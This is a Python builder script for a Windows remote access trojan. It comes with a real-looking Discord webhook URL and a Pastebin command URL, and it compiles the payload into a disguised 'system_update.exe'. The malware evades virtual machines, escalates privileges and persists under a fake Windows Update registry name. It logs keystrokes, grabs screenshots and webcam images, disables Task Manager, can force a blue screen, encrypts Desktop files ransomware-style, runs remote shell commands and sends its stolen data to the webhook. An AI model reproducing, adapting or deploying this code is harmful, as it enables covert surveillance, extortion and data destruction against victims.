pip install requests pillow pynput opencv-python cryptography pywin32 pyinstaller pyperclip pynput

https://discord.com/api/webhooks/1453461921733939202/NpZz8x6PQZsh9GmJUIpPT4hK12PJEOm8V0y23nRTtBBbvdk_5c4iin076WJK3srQN2Px

https://pastebin.com/raw/m5U6eger




import os
import subprocess

webhook_url = input("Paste your Discord webhook URL here: ").strip()
command_url = input("Paste your Pastebin raw URL here: ").strip()
output_name = "system_update.exe"

rat_code = f'''
import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, cv2, sqlite3, shutil, zipfile, re, ctypes, sys, pyperclip
from PIL import ImageGrab
from pynput import keyboard
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "{webhook_url}"
COMMAND_URL = "{command_url}"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = []

def send(msg="", embed=None, file=None):
    data = {{"content": msg}}
    if embed: data["embeds"] = [embed]
    files = {{"file": file}} if file else None
    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except: pass

def info():
    data = {{
        "Victim ID": VICTIM_ID,
        "User": getpass.getuser(),
        "Host": socket.gethostname(),
        "OS": platform.system() + " " + platform.release(),
        "IP": requests.get("https://api.ipify.org", timeout=5).text
    }}
    embed = {{"title": f"New Victim {{VICTIM_ID}}", "description": "\\n".join([f"**{{k}}**: {{v}}" for k,v in data.items()]), "color": 16711680}}
    send(embed=embed)

def anti_vm():
    bad = ["virtual", "vmware", "vbox", "qemu", "xen"]
    try:
        if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in bad):
            sys.exit(0)
    except: pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except: pass

def on_press(key):
    global KEYLOG_BUFFER
    KEYLOG_BUFFER.append(str(key))
    if len(KEYLOG_BUFFER) > 100:
        send(f"Keylog {{VICTIM_ID}}:\\n" + "".join(KEYLOG_BUFFER[-100:]))
        KEYLOG_BUFFER = []

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send(f"Screenshot {{VICTIM_ID}}", file=("ss.png", buf, "image/png"))

def webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if ret:
        _, buf = cv2.imencode(".jpg", frame)
        send(f"Webcam {{VICTIM_ID}}", file=("wc.jpg", io.BytesIO(buf.tobytes()), "image/jpeg"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send(f"{{VICTIM_ID}} locked.")

def toggle_tm(enable=True):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
        winreg.CloseKey(key)
        send(f"Task Manager {{'enabled' if enable else 'disabled'}} on {{VICTIM_ID}}")
    except: pass

def bsod():
    send(f"BSOD triggered on {{VICTIM_ID}}")
    enabled = ctypes.c_bool()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(enabled))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"KEY {{VICTIM_ID}}: {{key.decode()}} - SAVE IT")
    count = 0
    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp, "rb") as data: encrypted = f.encrypt(data.read())
                    with open(fp + ".locked", "wb") as out: out.write(encrypted)
                    os.remove(fp)
                    count += 1
                except: pass
    send(f"Encrypted {{count}} files on {{VICTIM_ID}}")

def shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e: out = str(e)
    send(f"Shell {{VICTIM_ID}}:\\n{{out[:3000]}}")

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                send(f"Running: {{full}}")
                if cmd in ["ss", "screenshot"]: screenshot()
                elif cmd in ["wc", "webcam"]: webcam()
                elif cmd == "lock": lock_pc()
                elif cmd == "disabletm": toggle_tm(False)
                elif cmd == "enabletm": toggle_tm(True)
                elif cmd == "bsod": bsod()
                elif cmd == "encrypt": encrypt(arg or None)
                elif cmd == "shell": shell(arg)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    anti_vm()
    elevate()
    persist()
    info()
    keyboard.Listener(on_press=on_press).start()
    threading.Thread(target=poll, daemon=True).start()
    while True: time.sleep(3600)
'''

with open("rat.py", "w", encoding="utf-8") as f: f.write(rat_code)

print("Building EXE...")
subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--name", output_name, "rat.py"])

os.remove("rat.py")
shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)

print(f"Done. EXE is in dist\\{output_name}")
